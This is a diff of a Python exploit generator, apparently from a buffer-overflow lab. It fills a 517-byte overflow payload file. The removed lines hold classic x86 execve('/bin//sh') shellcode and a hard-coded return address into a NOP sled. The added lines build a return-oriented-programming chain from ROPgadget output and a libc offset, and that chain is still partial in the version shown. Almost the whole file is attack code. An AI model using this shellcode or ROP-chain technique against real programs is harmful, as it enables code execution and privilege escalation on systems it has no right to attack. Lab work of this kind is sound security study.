@@ -1,40 +1,55 @@
 #!/usr/bin/python3
-import sys
+import argparse
+import binascii
+import os, sys
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))    # For importing ROPChain
+from rop_chain import ROPChain
 
-shellcode= (
-    "\x31\xc0"             # xorl    %eax,%eax
-    "\x50"                 # pushl   %eax
-    "\x68""//sh"           # pushl   $0x68732f2f
-    "\x68""/bin"           # pushl   $0x6e69622f
-    "\x89\xe3"             # movl    %esp,%ebx
-    "\x50"                 # pushl   %eax
-    "\x53"                 # pushl   %ebx
-    "\x89\xe1"             # movl    %esp,%ecx
-    "\x99"                 # cdq
-    "\xb0\x0b"             # movb    $0x0b,%al
-    "\xcd\x80"             # int     $0x80
-    "\x00"
-).encode('latin-1')
+class GenerateShellcode:
+    def __init__(self, args):
+        # Fill the buffer with NOP's (x90)
+        self.buffer = bytearray(b'\x90' * 517)
+        self.buffer_offset = 23
+        self.buffer_word_index = 0
 
-# Fill the content with NOP's
+        self.gadgets_path = args.gadgets
+        self.libc_offset = int(args.libc_offset, 16)
 
-# NOP: x90
-content = bytearray(b'\x90' * 517)
+        self.rop_chain = ROPChain(self.gadgets_path)
+        self.rop_chain.parse_gadgets_file()
 
-# Replace 0 with the correct offset value
-offset = 23
+    def store_word(self, word):
+        num_bytes = 4
+        reversed_bytes = word.to_bytes(num_bytes, byteorder='little')
+        print(binascii.hexlify(reversed_bytes))
 
-# Fill the return address field with the address of the shellcode
-content[offset+0] = 0xf3   # least significant byte
-content[offset+1] = 0xef
-content[offset+2] = 0xff
-content[offset+3] = 0xbf   # most significant byte
+        for i in range(num_bytes):  # Iterate over each of the four bytes in the word
+            index = self.buffer_offset + num_bytes*self.buffer_word_index + i
+            self.buffer[index] = reversed_bytes[i]
+            print("Index: " + str(index) + " => " + hex(reversed_bytes[i]))
 
-# Put the shellcode at the end
-start = 517 - len(shellcode)
-content[start:] = shellcode
+        self.buffer_word_index += 1
 
-# Write the content to badfile
-file = open("shellcode", "wb")
-file.write(content)
-file.close()
+    def store_gadget(self, gadget_str):
+        libc_gadget = self.rop_chain.get_gadget(gadget_str) + self.libc_offset
+        self.store_word(libc_gadget)
+
+    def get_shellcode(self):
+        self.store_gadget("xor eax, eax ; ret ;")        # 0xb7ee73f8
+        self.store_gadget("pop ecx ; pop edx ; ret ;")   # 0xb7e34c6e
+        self.store_word(0x0b0b0b0b)
+
+
+if __name__ == "__main__":
+    arg_parser = argparse.ArgumentParser(description="Create a ROP chain using the gadgets found")
+    arg_parser.add_argument("gadgets", help="File path of the gadgets returned by ROPgadget")
+    arg_parser.add_argument("libc_offset", help="Offset of libc")
+    args = arg_parser.parse_args()
+
+    gen_shellcode = GenerateShellcode(args)
+    gen_shellcode.get_shellcode()
+
+    # Write the content to badfile
+    file = open("shellcode", "wb")
+    file.write(gen_shellcode.buffer)
+    file.close()
